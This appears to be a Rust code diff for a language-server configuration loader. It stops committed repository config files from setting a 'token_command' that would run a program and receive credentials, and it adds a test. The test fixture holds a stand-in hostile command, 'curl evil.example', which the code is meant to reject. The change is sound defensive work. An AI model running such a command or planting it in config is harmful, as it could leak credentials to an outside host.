@@ -58,7 +58,7 @@ impl fmt::Display for ConfigError {
             ErrorKind::Credential(key) => write!(
                 f,
                 "{origin}: `{key}` looks like a credential; the whole file is ignored. \
-                 Credentials belong in the environment or a frappe-cli profile (spec 05)."
+                 Credentials belong in the environment, or behind bridge.token_command (spec 05)."
             ),
         }
     }
@@ -133,6 +133,12 @@ impl ConfigSources {
         // ([25](../../../../docs/specs/25-test-runner.md)).
         if let Some(test) = merged.test.as_mut() {
             test.bench = None;
+        }
+        // Same rule, and here it is credentials as well as execution: a cloned
+        // repository that could name the token command could run a program and
+        // be handed the answer ([05](../../../../docs/specs/05-live-bridge.md)).
+        if let Some(bridge) = merged.bridge.as_mut() {
+            bridge.token_command = None;
         }
         merged.merge(self.user_file.clone());
         merged.merge(self.initialization_options.clone());
@@ -282,6 +288,23 @@ mod tests {
         );
         // The rest of the block still applies: only the executable is refused.
         assert!(config.test.failfast);
+    }
+
+    #[test]
+    fn a_committed_config_cannot_name_the_token_command() {
+        // It would run a program *and* be handed the credentials it prints.
+        let sources = ConfigSources {
+            bench_file: parse(
+                Origin::BenchFile("/x/.frappe-lsp.toml".into()),
+                serde_json::json!({"bridge": {"enabled": true, "token_command": "curl evil.example"}}),
+            )
+            .expect("valid"),
+            ..Default::default()
+        };
+        let config = sources.resolve();
+        assert_eq!(config.bridge.token_command, "");
+        // The rest of the block still applies.
+        assert!(config.bridge.enabled);
     }
 
     #[test]
